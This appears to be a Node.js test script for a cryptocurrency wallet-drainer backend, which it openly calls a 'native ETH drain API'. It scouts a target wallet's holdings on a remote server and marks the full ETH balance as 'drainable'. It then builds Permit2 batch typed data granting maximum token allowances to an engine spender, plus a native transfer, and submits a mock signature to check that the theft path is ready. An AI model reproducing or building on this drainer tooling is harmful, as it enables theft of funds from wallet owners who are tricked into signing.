/**
 * Mainnet native ETH drain API simulation (no private key required).
 *
 * Usage:
 *   node scripts/test-native-eth-drain.mjs
 *   TEST_WALLET=0x… node scripts/test-native-eth-drain.mjs
 */
const BACKEND = process.env.BACKEND_URL || 'https://legionapi-production.up.railway.app';
const WALLET = process.env.TEST_WALLET || '0xbe3cebae5728C07F39416f0dC1d0165d2972db12';
const USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
const NATIVE_ETH_ANCHOR = '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee';
const CHAIN_ID = 1;

function parseEnvelope(res, data) {
  if (!data || typeof data !== 'object') return { ok: res.ok, data };
  function unwrap(payload) {
    if (payload == null || typeof payload !== 'object') return payload;
    if (payload.data != null && (typeof payload.ok === 'boolean' || typeof payload.success === 'boolean')) {
      return payload.data;
    }
    return payload;
  }
  if (typeof data.ok === 'boolean') {
    return { ok: data.ok, message: data.message, data: unwrap(data.data ?? data) };
  }
  if (typeof data.success === 'boolean') {
    return { ok: data.success, message: data.message, data: unwrap(data.data ?? data) };
  }
  return { ok: res.ok, data };
}

async function apiPost(path, body) {
  const res = await fetch(`${BACKEND}${path}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
    signal: AbortSignal.timeout(90_000),
  });
  const raw = await res.json().catch(() => ({}));
  const env = parseEnvelope(res, raw);
  return { status: res.status, ok: env.ok, message: env.message, data: env.data, raw };
}

console.log('=== Native ETH Drain API Simulation ===\n');
console.log('Backend:', BACKEND);
console.log('Wallet:', WALLET, '\n');

const ranked = await apiPost('/api/v1/scout/ranked', { wallet_address: WALLET, chain_family: 'EVM' });
console.log('1. Ranked scout:', ranked.ok ? 'OK' : 'FAIL', ranked.message || '');
const assets = ranked.data?.assets ?? [];
const nativeEth = assets.find((a) => a.token === 'native' && a.family === 'EVM');
console.log('   Native ETH:', nativeEth ? `${nativeEth.amount_raw} wei` : 'none');
console.log('   ERC20 count:', assets.filter((a) => a.token !== 'native').length);

let ethNativeWei = '0';
if (nativeEth?.amount_raw) {
  const weiBal = BigInt(String(nativeEth.amount_raw));
  if (weiBal > 0n) ethNativeWei = weiBal.toString();
}
console.log('   Drainable native (full balance):', ethNativeWei, 'wei\n');

const permits = assets
  .filter((a) => a.token !== 'native' && a.token?.startsWith('0x'))
  .slice(0, 8)
  .map((a) => ({
    token: a.token,
    amount: a.amount_raw || '115792089237316195423570985008687907853269984665640564039457584007913129639935',
  }));

const batch = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', {
  wallet_address: WALLET,
  chain_id: CHAIN_ID,
  permits,
  nativeAmount: ethNativeWei,
});
console.log('2. Permit2 batch typed-data:', batch.status, batch.ok ? 'OK' : 'FAIL');
if (!batch.ok) {
  console.log('   Error:', batch.message);
  process.exit(1);
}
const d = batch.data;
console.log('   typed_data:', !!d?.typed_data);
console.log('   batch_permit_metadata:', !!d?.batch_permit_metadata);
console.log('   permit_count:', d?.batch_permit_metadata?.details?.length ?? 0);
console.log('   nativeAmount:', d?.nativeAmount);
console.log('   native_transfer:', !!d?.native_transfer);
if (d?.native_transfer) {
  console.log('   native_transfer.to:', d.native_transfer.to);
  console.log('   native_transfer.value:', d.native_transfer.value);
}
console.log('');

const mockSig = '0x' + 'ab'.repeat(65);
const anchorToken =
  d.batch_permit_metadata?.details?.[0]?.token ||
  (ethNativeWei !== '0' ? NATIVE_ETH_ANCHOR : USDC);
const anchor = await apiPost('/api/v1/signature-anchor', {
  ingress: 'normalized_v1',
  chain_family: 'EVM',
  protocol: 'omnichain_atomic_v1',
  wallet_address: WALLET,
  token_address: anchorToken,
  permits: d.permits || permits,
  batch_permit_metadata: d.batch_permit_metadata,
  chain_id: CHAIN_ID,
  engine_spender: d.engine_spender,
  permit2: d.permit2,
  nativeAmount: d.nativeAmount || ethNativeWei,
  signature: d?.typed_data ? mockSig : '0x00',
  native_signed_transaction: ethNativeWei !== '0' ? ('0x02' + 'cd'.repeat(100)) : undefined,
  nonce: 'e2e-test:' + Date.now(),
  expiry_iso: '2099-12-31T23:59:59.999Z',
  wallet_type: 'MetaMask',
  scout_value_usd: 10,
  max_allowance: '115792089237316195423570985008687907853269984665640564039457584007913129639935',
  requires_quorum: false,
});
console.log('3. Signature anchor (mock sig):', anchor.status, (anchor.message || '').slice(0, 120));
console.log('   (Expect validation fail without real signatures)\n');

const pass =
  !!d?.batch_permit_metadata &&
  (ethNativeWei === '0' || !!d?.native_transfer) &&
  (ethNativeWei === '0' || !d?.typed_data || !!d?.typed_data);
console.log('=== Summary ===');
console.log(pass ? 'PASS — native ETH drain API path ready' : 'FAIL — see above');
process.exit(pass ? 0 : 1);
